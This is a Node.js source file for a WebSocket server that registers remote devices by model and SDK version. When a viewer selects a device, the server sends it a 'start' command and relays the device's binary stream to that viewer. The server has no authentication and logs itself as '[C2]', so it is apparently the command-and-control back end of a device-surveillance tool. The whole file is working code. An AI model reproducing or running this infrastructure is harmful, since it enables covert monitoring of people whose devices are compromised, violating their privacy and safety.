const express  = require('express');
const http     = require('http');
const { WebSocketServer } = require('ws');
const path     = require('path');

const app    = express();
const server = http.createServer(app);
const devWss    = new WebSocketServer({ noServer: true });
const portalWss = new WebSocketServer({ noServer: true });
const devices  = new Map();
const portals  = new Map();

app.use(express.static(path.join(__dirname, 'public')));

server.on('upgrade', (req, sock, head) => {
    if (req.url === '/device') {
        devWss.handleUpgrade(req, sock, head, ws => devWss.emit('connection', ws, req));
    } else if (req.url.startsWith('/portal')) {
        portalWss.handleUpgrade(req, sock, head, ws => portalWss.emit('connection', ws, req));
    } else {
        sock.destroy();
    }
});

devWss.on('connection', (ws) => {
    let devId = null;
    ws.on('message', (data, isBinary) => {
        if (!isBinary) {
            const msg = JSON.parse(data.toString());
            if (msg.type === 'hello') {
                devId = msg.id;
                devices.set(devId, { ws, meta: msg, portals: new Set() });
                broadcast(portalWss, JSON.stringify({ type: 'device_list', devices: deviceList() }));
                console.log('[+] device', devId, msg.model);
            }
        } else {
            if (devId && devices.has(devId)) {
                const dev = devices.get(devId);
                dev.portals.forEach(pws => { if (pws.readyState === 1) pws.send(data, { binary: true }); });
            }
        }
    });
    ws.on('close', () => {
        if (devId) {
            devices.delete(devId);
            broadcast(portalWss, JSON.stringify({ type: 'device_list', devices: deviceList() }));
        }
    });
});

portalWss.on('connection', (ws) => {
    ws.send(JSON.stringify({ type: 'device_list', devices: deviceList() }));
    ws.on('message', (data) => {
        const msg = JSON.parse(data.toString());
        if (msg.type === 'watch') {
            const prev = portals.get(ws);
            if (prev && devices.has(prev)) devices.get(prev).portals.delete(ws);
            portals.set(ws, msg.id);
            if (devices.has(msg.id)) {
                devices.get(msg.id).portals.add(ws);
                devices.get(msg.id).ws.send(JSON.stringify({ cmd: 'start' }));
            }
        }
    });
    ws.on('close', () => {
        const devId = portals.get(ws);
        if (devId && devices.has(devId)) devices.get(devId).portals.delete(ws);
        portals.delete(ws);
    });
});

function deviceList() {
    return [...devices.entries()].map(([id, d]) => ({ id, model: d.meta.model, sdk: d.meta.sdk }));
}
function broadcast(wss, msg) {
    wss.clients.forEach(c => { if (c.readyState === 1) c.send(msg); });
}

server.listen(process.env.PORT || 3000, () => console.log('[C2] :' + (process.env.PORT || 3000)));
